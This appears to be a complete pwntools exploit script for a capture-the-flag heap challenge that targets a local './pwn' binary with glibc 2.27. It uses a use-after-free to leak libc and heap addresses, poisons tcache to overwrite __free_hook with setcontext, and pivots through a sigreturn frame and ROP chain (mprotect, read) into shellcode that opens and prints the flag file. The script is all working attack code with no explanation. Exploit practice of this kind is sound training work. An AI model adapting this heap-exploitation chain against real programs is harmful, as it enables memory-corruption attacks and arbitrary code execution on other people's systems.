from pwn import *
context.log_level="debug"
context.arch="amd64"
sh=process("./pwn")
def cmd(c):
    sh.sendlineafter(b">>",str(c).encode())
def add(size,ctt):
    cmd(0)
    sh.sendlineafter(b"size:\n",str(size).encode())
    sh.sendlineafter(b"content:\n", ctt)
def dele(idx):
    cmd(1)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
def edit(idx,ctt):
    cmd(2)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
    sh.sendlineafter(b"content:\n", ctt)
def show(idx):
    cmd(3)
    sh.sendlineafter(b"idx:\n", str(idx).encode())
add(0x410,b'a') #0
add(0x100,b'a') #1
add(0x100,b'a') #2
add(0x100,b'a') #3 0x15a0+0x10
add(0x100,b'a') #4 0x16b0+0x10
dele(0)
show(0)
leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x3ebca0
success("libcbase:"+hex(libcbase))
libc=ELF("./libc-2.27.so")

system=libcbase+libc.sym['system']
freehook=libcbase+libc.sym['__free_hook']
mprotect=libcbase+libc.sym['mprotect']
read=libcbase+libc.sym['read']
setcontext=libcbase+0x52085
rdi=0x000000000002164f+libcbase
rsi=0x0000000000023a6a+libcbase
rdx=0x0000000000001b96+libcbase

dele(1)
dele(2)
show(2)
sh.recvuntil(b'\x0a')
leak_heap=u64(sh.recv(6).ljust(8,b'\x00'))
success("leak_heap:"+hex(leak_heap))
heapbase=leak_heap-0x1390
success("heapbase:"+hex(heapbase))

sig=SigreturnFrame()
sig.rdi=libcbase&(~0xfff)
sig.rsi=0x1000
sig.rdx=7
sig.rip=mprotect
sig.rsp=heapbase+0x16b0+0x10
edit(3,bytes(sig)[:0xb0])
fakestack=p64(rdi)+p64(0)+p64(rsi)+p64(libcbase)+p64(rdx)+p64(0x100)+p64(read)+p64(libcbase)
edit(4,fakestack)

edit(2,p64(freehook))
add(0x100,b'a') #5
add(0x100,p64(setcontext))
# gdb.attach(sh)
dele(3)
sleep(0.3)
shellcode=shellcraft.open("flag")
shellcode+=shellcraft.read('rax','rsp',0x40)
shellcode+=shellcraft.write(1,'rsp',0x40)
shellcode=asm(shellcode)
sh.sendline(shellcode)
sh.interactive()
